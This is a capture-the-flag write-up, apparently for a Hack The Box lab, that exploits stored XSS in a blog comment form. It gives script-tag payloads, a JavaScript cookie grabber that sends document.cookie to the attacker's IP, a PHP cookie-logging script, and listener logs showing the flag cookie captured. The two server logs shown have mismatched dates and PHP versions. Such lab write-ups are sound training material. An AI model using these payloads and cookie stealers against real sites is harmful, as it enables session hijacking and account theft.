# Cross-Site Scripting (XSS) Skills Assessment

## Objective: 
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. 
In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

- Identify a user-input field that is vulnerable to an XSS vulnerability
- Find a working XSS payload that executes JavaScript code on the target's browser
- Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag

---

<img width="1207" height="630" alt="image" src="https://github.com/user-attachments/assets/0576a823-61e7-4bc1-b7c2-5deeec578189" />
<img width="1671" height="506" alt="image" src="https://github.com/user-attachments/assets/86a51e56-218c-4d6c-a6ff-12d80d8fe85f" />

<img width="702" height="609" alt="image" src="https://github.com/user-attachments/assets/5cb92a16-df0c-4546-a6fb-a3208ff7027b" />



```
$ sudo nc -nvlp 9001
listening on [any] 9001 ...
```

Use the payload '><script src="http://<IP>:<Port>/FieldName"></script> in the all of the fields to see which ones will request a file to the nc listener:


Comment = `'><script src="http://10.10.14.47:9001/CommentField"></script>`

Name* = `'><script src="http://10.10.14.47:9001/NameField"></script>`

Email* = `'><script src="http://10.10.14.47:9001/EmailField"></script>`

Website* = `'><script src="http://10.10.14.47:9001/WebsiteField"></script>`

<img width="686" height="620" alt="image" src="https://github.com/user-attachments/assets/ec584086-333e-4d70-8653-02ccdc017714" />

<img width="727" height="186" alt="image" src="https://github.com/user-attachments/assets/261c7468-8ff4-4a3a-919b-eb4c109b64cd" />

<img width="799" height="622" alt="image" src="https://github.com/user-attachments/assets/3cd333ad-866c-4829-b016-ed0fe7b0dd66" />

```
$ sudo nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.47] from (UNKNOWN) [10.129.68.16] 51038
GET /WebsiteField HTTP/1.1
Host: 10.10.14.47:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.101 Safari/537.36
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Now that theres a vulnerable field found,  write a JS cookie grabber to a local file named `script.js`: 

```

new Image().src='http://10.10.14.47:9001/index.php?c=' + document.cookie;

```

Then, write a PHP script named `index.php`: 

``` 
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start an HTTP server with PHP in the same directory where `script.js` and `index.php` are:

```
$ php -S 0.0.0.0:9001
[Mon Sep 29 22:09:23 2025] PHP 8.2.29 Development Server (http://0.0.0.0:9001) started
```

Use the XSS payload in the "website" field to steal the cookie: 

`'><script src=http://IP:PORT/script.js></script> `

<img width="864" height="619" alt="image" src="https://github.com/user-attachments/assets/0527d96d-5e85-49ff-bc9a-06972f3624cf" />

```
$ php -S 0.0.0.0:9001
[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 [200]: (null) /script.js
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 [200]: GET /WebsiteField
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Closing
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Closing
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Accepted
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1669695315;%20flag=HTB{crXXXXXXXXXXXXXn1nj4} <------- flag
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Closing
```
---















